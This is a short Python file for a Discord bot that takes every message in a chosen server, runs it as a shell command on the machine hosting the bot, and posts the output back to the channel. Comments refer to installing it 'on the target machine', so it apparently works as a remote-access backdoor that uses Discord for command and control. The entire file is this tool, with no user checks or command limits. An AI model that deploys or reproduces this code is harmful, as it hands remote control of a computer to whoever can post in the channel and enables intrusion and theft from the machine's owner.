# bot.py

import os
import subprocess
#run "pip install -U discord.py" on the target machine to run properly.
import discord

#Include this line to allow your bot to read and respond in a server. You can update it to give it only the permissions it needs, I haven't taken the time to figure that out yet.
intents = discord.Intents.all()

#Replace with your own Discord Token and Server Name. Not the best security practice, but it allows your bot to speak to Discord.
TOKEN = "<DISCORD TOKEN>"
GUILD = "<DISCORD SERVER NAME>"

client = discord.Client(intents=intents)

#Executes when your bot is ready (the bot will appear online in Discord)
@client.event
async def on_ready():
  for guild in client.guilds:
    if guild.name == GUILD:
      break
  print(
    f'{client.user} is connected to the following guild:\n'
    f'{guild.name}(id: {guild.id})'
  )

#Runs when any user (except the bot) sends a message.
@client.event
async def on_message(message):
  if message.author == client.user:
    return
    
  #Checks if the message is not blank
  command = message.content.split()
  #print(message.content) <- Used to debug
  if not command:
    return


  try:
    #execute the command and return the output in Discord
    process = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    output = process.stdout.decode("utf-8")
    error_output = process.stderr.decode("utf-8")

    if output:
      await message.channel.send(output)
    if error_output:
      await message.channel.send(error_output)
  except subprocess.CalledProcessError as error:
    await message.channel.send(error.output.decode("utf-8"))

#Run the bot
client.run(TOKEN)
